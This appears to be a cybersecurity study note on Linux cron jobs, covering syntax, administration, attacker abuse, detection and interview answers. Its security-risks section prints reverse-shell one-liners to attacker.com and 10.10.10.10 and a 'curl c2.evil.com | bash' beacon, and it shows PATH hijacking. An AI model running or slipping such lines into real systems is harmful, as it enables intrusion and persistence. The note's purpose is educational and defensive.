---
tags:
  - "#cybersecurity/systems/linux"
  - "#interview/concepts"
aliases:
  - Cron
  - Scheduled Tasks (Linux)
  - Crontab
---

# Cron Jobs

> **One-liner:** Linux's time-based job scheduler that automatically executes commands or scripts at specified intervals.

## 🎯 What Is It?
Cron is a Unix/Linux daemon that runs scheduled tasks (called "cron jobs") at predetermined times or intervals. It's essential for system automation, maintenance tasks, backups, log rotation, and security monitoring.

The name comes from "Chronos" (Greek for time).

## 🤔 Why It Matters

### For System Administrators
- **Automation:** Backups, log rotation, system updates
- **Monitoring:** Scheduled health checks, disk space alerts
- **Maintenance:** Database cleanup, temp file removal

### For Security (Blue Team)
- **Detection:** Automated threat hunting scripts
- **Response:** Scheduled IOC checks, log analysis
- **Monitoring:** Periodic vulnerability scans

### For Attackers (Red Team)
- **Persistence:** Create malicious cron jobs for backdoor access
- **[[Privilege Escalation]]:** Exploit misconfigured cron jobs running as root
- **Lateral Movement:** Schedule payload execution

## 🔬 How It Works

### Core Components
1. **crond** - The cron daemon (runs in background)
2. **crontab** - User's cron table (schedule configuration)
3. **Job** - Command or script to execute

### Cron Daemon
```bash
# Check if cron is running
systemctl status cron      # Debian/Ubuntu
systemctl status crond     # RHEL/CentOS

# Start cron
systemctl start cron
```

### Crontab Format
```
* * * * * command_to_execute
│ │ │ │ │
│ │ │ │ └─── Day of week (0-7, Sunday=0 or 7)
│ │ │ └───── Month (1-12)
│ │ └─────── Day of month (1-31)
│ └───────── Hour (0-23)
└─────────── Minute (0-59)
```

## 📊 Crontab Syntax Examples

| Schedule | Crontab Entry | Description |
|----------|---------------|-------------|
| Every minute | `* * * * *` | Runs every minute |
| Every hour | `0 * * * *` | Runs at minute 0 of every hour |
| Daily at 2 AM | `0 2 * * *` | Runs at 02:00 |
| Weekly (Sunday) | `0 2 * * 0` | Runs at 02:00 every Sunday |
| Monthly (1st) | `0 2 1 * *` | Runs at 02:00 on the 1st |
| Weekdays only | `0 9 * * 1-5` | Runs at 09:00 Mon-Fri |
| Every 5 minutes | `*/5 * * * *` | Runs every 5 minutes |
| Every 6 hours | `0 */6 * * *` | Runs every 6 hours |

## 🔧 Working with Crontab

### Basic Commands
```bash
# View current user's crontab
crontab -l

# Edit current user's crontab
crontab -e

# View another user's crontab (requires sudo)
sudo crontab -u username -l

# Remove crontab
crontab -r

# View system-wide crontab
cat /etc/crontab
```

### System-Wide Cron Directories
```bash
/etc/cron.d/         # Additional cron jobs
/etc/cron.daily/     # Scripts run daily
/etc/cron.hourly/    # Scripts run hourly
/etc/cron.weekly/    # Scripts run weekly
/etc/cron.monthly/   # Scripts run monthly
```

### Example: Schedule Daily Backup
```bash
# Edit crontab
crontab -e

# Add this line (backup at 3 AM daily)
0 3 * * * /home/user/scripts/backup.sh

# With logging
0 3 * * * /home/user/scripts/backup.sh >> /var/log/backup.log 2>&1
```

## 🔓 Security Risks

### 1. Privilege Escalation
**Scenario:** Writable script executed by root's cron job
```bash
# Root's cron job runs this script
*/5 * * * * /opt/maintenance/cleanup.sh

# If /opt/maintenance/cleanup.sh is writable by user:
echo "bash -i >& /dev/tcp/attacker.com/4444 0>&1" >> /opt/maintenance/cleanup.sh
# Wait 5 minutes → root reverse shell
```

### 2. Persistence
**Attacker adds malicious cron job:**
```bash
# Reverse shell every hour
0 * * * * /bin/bash -c 'bash -i >& /dev/tcp/10.10.10.10/4444 0>&1'

# Beacon back to C2
*/10 * * * * curl http://c2.evil.com/beacon | bash
```

### 3. Path Hijacking
```bash
# Cron job without full path
*/5 * * * * backup_script.sh

# Attacker manipulates PATH
PATH=/tmp:$PATH
# Creates malicious /tmp/backup_script.sh
```

## 🛡️ Detection & Prevention

### How to Detect (Blue Team)

#### Monitor Cron Job Changes
```bash
# Audit /etc/crontab and user crontabs
auditctl -w /etc/crontab -p wa -k cron_changes
auditctl -w /var/spool/cron/ -p wa -k cron_changes

# Check for unusual cron jobs
find /var/spool/cron/ -type f -exec cat {} \;
cat /etc/crontab
ls -la /etc/cron.*
```

#### Baseline Legitimate Cron Jobs
```bash
# Create baseline
crontab -l > /baseline/cron_baseline.txt

# Compare for changes
diff /baseline/cron_baseline.txt <(crontab -l)
```

#### Indicators of Malicious Cron Jobs
- Network connections (curl, wget, nc)
- Base64 encoded commands
- `/dev/tcp` or `/dev/udp` usage
- Jobs running as root with unusual paths
- Jobs owned by unexpected users

### How to Prevent / Mitigate

| Control | Implementation | Purpose |
|---------|----------------|---------|
| **Restrict crontab access** | `/etc/cron.allow` and `/etc/cron.deny` | Limit who can create cron jobs |
| **File permissions** | Scripts executed by cron should not be world-writable | Prevent tampering |
| **Use full paths** | `/usr/bin/python3` not `python3` | Avoid PATH hijacking |
| **Log output** | Redirect to log files | Audit trail |
| **Monitor changes** | File integrity monitoring (AIDE, Tripwire) | Detect modifications |
| **Principle of least privilege** | Don't run as root unless necessary | Limit blast radius |

#### Restrict Cron Access
```bash
# Allow only specific users
echo "root" > /etc/cron.allow
echo "admin" >> /etc/cron.allow

# Deny specific users
echo "baduser" > /etc/cron.deny
```

#### Secure Cron Script Permissions
```bash
# Make script executable by owner only
chmod 700 /home/user/scripts/backup.sh
chown root:root /home/user/scripts/backup.sh

# Verify
ls -l /home/user/scripts/backup.sh
# Should show: -rwx------ 1 root root
```

## 🎤 Interview Angles

### Common Questions
- **"What are cron jobs?"**
  - *"Cron jobs are scheduled tasks in Linux that run automatically at specified times or intervals. They're used for automation like backups, log rotation, and system maintenance."*

- **"How would an attacker use cron for persistence?"**
  - *"An attacker with initial access could add a malicious cron job that executes a reverse shell or beacons back to a C2 server periodically, maintaining access even after detection and removal of initial payload."*

- **"How do you secure cron jobs?"**
  - *"Restrict who can create cron jobs using /etc/cron.allow, ensure scripts have proper permissions (not world-writable), use full paths in commands to prevent PATH hijacking, log all cron job output, and monitor for unauthorized changes with file integrity tools."*

- **"Explain this crontab entry: `*/15 * * * * /usr/bin/python3 /opt/monitor.py`"**
  - *"This runs every 15 minutes, executes Python 3 with the script /opt/monitor.py. The */15 means every 15 minutes, and the remaining asterisks mean any hour, any day, any month, any day of week."*

### STAR Story
> **Situation:** During incident response, we discovered persistent access despite removing attacker's SSH keys and backdoors.
> **Task:** Identify how attacker was maintaining access and eliminate all persistence mechanisms.
> **Action:** Audited all cron jobs system-wide using `for user in $(cut -f1 -d: /etc/passwd); do echo "=== $user ==="; sudo crontab -u $user -l 2>/dev/null; done`. Found malicious cron job in compromised user account executing base64-encoded reverse shell every 10 minutes. Removed cron job, reset credentials, implemented file integrity monitoring on `/var/spool/cron/`, and deployed detection rule for suspicious cron job patterns.
> **Result:** Eliminated persistent access, detected similar technique in two other systems before attackers used them, and prevented reinfection.

## ✅ Best Practices
- Use `/etc/cron.allow` to whitelist authorized users
- Always use absolute paths in cron jobs
- Redirect output to log files for audit trail
- Set proper permissions on scripts (chmod 700, owner root)
- Test cron jobs before deploying
- Document all production cron jobs
- Monitor `/var/spool/cron/` with file integrity tools
- Use `@reboot` sparingly and document its use

## ❌ Common Misconceptions
- **"Cron runs with your current environment"** → Cron has minimal PATH and no shell environment
- **"% means comment in crontab"** → `%` is newline in cron, must be escaped
- **"Cron emails errors automatically"** → Only if `MAILTO` is set
- **"Deleted crontab can be recovered"** → No backup by default, gone forever

## 🔗 Related Concepts
- [[Privilege Escalation]]
- [[Persistence]]
- [[Lateral Movement]]
- [[Linux Fundamentals]]
- [[023 Systems]]
- [[020 Infrastructure & Networking MOC]]
- [[011 🛡️ Blue Team & SOC Operations MOC]]
- [[012 ⚔️ Red Team & Offensive Security MOC]]

## 📚 References
- `man 5 crontab` - Crontab format
- `man cron` - Cron daemon
- MITRE ATT&CK: T1053.003 (Scheduled Task/Job: Cron)
- https://crontab.guru/ - Cron schedule expression editor
